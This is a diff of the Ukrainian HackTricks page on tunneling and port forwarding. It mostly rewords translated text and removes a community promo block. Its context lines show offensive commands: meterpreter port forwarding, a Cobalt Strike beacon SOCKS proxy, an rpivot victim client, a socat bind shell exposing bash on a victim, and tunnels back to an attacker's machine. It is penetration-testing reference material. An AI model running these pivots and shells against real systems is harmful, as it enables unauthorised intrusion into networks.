@@ -15,18 +15,10 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## Nmap tip
 
 {% hint style="warning" %}
-**ICMP** та **SYN** сканування не можуть бути тунельовані через проксі socks, тому ми повинні **вимкнути пінг-дослідження** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
+**ICMP** та **SYN** сканування не можуть бути тунельовані через сокс-проксі, тому ми повинні **вимкнути пінг-дослідження** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
 {% endhint %}
 
 ## **Bash**
@@ -126,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Локальний порт --> Скомпрометований хост (активна сесія) --> Третя\_машина:Порт
+Локальний порт --> Скомпрометований хост (активна сесія) --> Третій\_бокс:Порт
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -156,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Відкрийте порт на сервері команди, що прослуховує на всіх інтерфейсах, який можна використовувати для **маршрутизації трафіку через маяк**.
+Відкрийте порт на teamserver, який слухає на всіх інтерфейсах, що може бути використаний для **маршрутизації трафіку через beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -240,7 +232,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Прив'язати оболонку
+### Прив'язаний шелл
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
@@ -325,7 +317,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Вам потрібно мати **доступ до RDP через систему**.\
+Вам потрібно мати **доступ RDP до системи**.\
 Завантажте:
 
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP з'єднання**.
@@ -350,7 +342,7 @@ netstat -antb | findstr 1080
 
 ## Проксування Windows GUI додатків
 
-Ви можете налаштувати Windows GUI додатки на навігацію через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
+Ви можете налаштувати Windows GUI додатки для роботи через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
 У **Профіль -> Проксі-сервери** додайте IP-адресу та порт SOCKS сервера.\
 У **Профіль -> Правила проксування** додайте назву програми для проксування та з'єднання з IP-адресами, які ви хочете проксувати.
 
@@ -365,7 +357,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Він аутентифікується проти проксі-сервера та прив'язує порт локально, який перенаправляється на зовнішній сервіс, який ви вказуєте. Потім ви можете використовувати інструмент на ваш вибір через цей порт.\
+Він аутентифікується проти проксі і прив'язує порт локально, який перенаправляється на зовнішній сервіс, який ви вказуєте. Потім ви можете використовувати інструмент на ваш вибір через цей порт.\
 Наприклад, перенаправити порт 443
 ```
 Username Alice
@@ -374,7 +366,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Тепер, якщо ви налаштуєте, наприклад, на жертві службу **SSH** для прослуховування на порту 443. Ви можете підключитися до неї через порт атакуючого 2222.\
+Тепер, якщо ви налаштуєте, наприклад, на жертві сервіс **SSH** для прослуховування на порту 443. Ви можете підключитися до нього через порт атакуючого 2222.\
 Ви також можете використовувати **meterpreter**, який підключається до localhost:443, а атакуючий прослуховує на порту 2222.
 
 ## YARP
@@ -527,14 +519,6 @@ addr: file:///tmp/httpbin/
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
-**Спробуйте Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 {% hint style="success" %}
 Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
@@ -544,7 +528,7 @@ addr: file:///tmp/httpbin/
 <summary>Підтримайте HackTricks</summary>
 
 * Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
